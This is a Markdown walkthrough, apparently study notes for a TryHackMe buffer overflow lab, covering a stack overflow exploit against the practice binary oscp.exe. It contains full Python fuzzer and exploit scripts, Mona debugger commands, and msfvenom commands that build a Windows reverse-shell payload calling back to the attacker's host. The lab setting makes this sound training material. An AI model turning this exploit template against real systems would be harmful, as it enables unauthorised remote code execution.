# Process for Buffer Overflow
(Original source for this awesome tutorial: **Tib3rius** https://tryhackme.com/room/bufferoverflowprep )

## Summary of the process

- Crash The Application 
	1. fuzz.py (with while loop and without while loop)
	2. fuzz-http.py
- Find EIP 
	1. msf-pattern_create -l xxxx  
	2. msf-pattern_offset -l xxxx -q (xxxxxxxx)
	3. Mona commands
		- !mona config -set workingfolder c:\mona\%p
		- !mona findmsp -distance xxxx
		- !mona modules
- Controlling EIP
	1. return address - BBBB
	2. control-eip.py
- Identify Bad Characters
	1. for exploit.py -> bytearray.sh '\x00'
	2. Mona commands
		- !mona bytearray -b "\x00"
		- !mona compare -f C:\mona\oscp\bytearray.bin -a
- Find JMP ESP - msf-nasm_shell 
	1. nasm > jmp esp - FFE4 
		- !mona find -s "\xff\xe4" -m "modulename"
	3. nasm > jmp eax - FFE0 
		- !mona find -s "\xff\xe0" -m "modulename"
	5. nasm > jmp edx - FFE2 
		- !mona find -s "\xff\xe2" -m "modulename"
- Generate Shell Code
	- msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -b "\x00\x0a" -f py
	- msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"
- Exploit
	- final-exploit.py

## Detailed process
### connecting to process 
```nc -nv MACHINE_IP 1337```

### setting mona working folder
`!mona config -set workingfolder c:\mona\%p`


### Fuzzing 

`python2 fuzzer.py`
```
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

### Crash Replication & Controlling EIP

`python2 exploit.py`

```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```


### offset

`msf-pattern_create -l 600`

Copy the output and place it into the payload variable of the exploit.py script.

`python exploit.py`

After crach use following command

`!mona findmsp -distance 600`

Mona should display a `log window` with the output of the command/

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the `retn variable to "BBBB"`.

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).


### Finding Bad Characters

Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).

```!mona bytearray -b "\x00"```

`you can use the following python code as well`
```
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```
Update your exploit.py script and set the payload variable to the string of bad chars the script generates.


```!mona compare -f C:\mona\oscp\bytearray.bin -a <address>```

A popup window should appear labelled "mona Memory comparison results". Generate a new bytearray in mona, specifying these new badchars along with \x00.

Example as below
```!mona bytearray -b "\x00\x07\xa0"```


### Finding a Jump Point

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with **all the badchars** you identified (including \x00):

```!mona jmp -r esp -cpb "\x00"```

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.


### Generate Payload

Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with **all the badchars** you identified (including \x00):

```msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py -v payload```

Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.

**remove the preceding "b" in the var**

### Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```padding = "\x90" * 16```

### Exploit!

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!
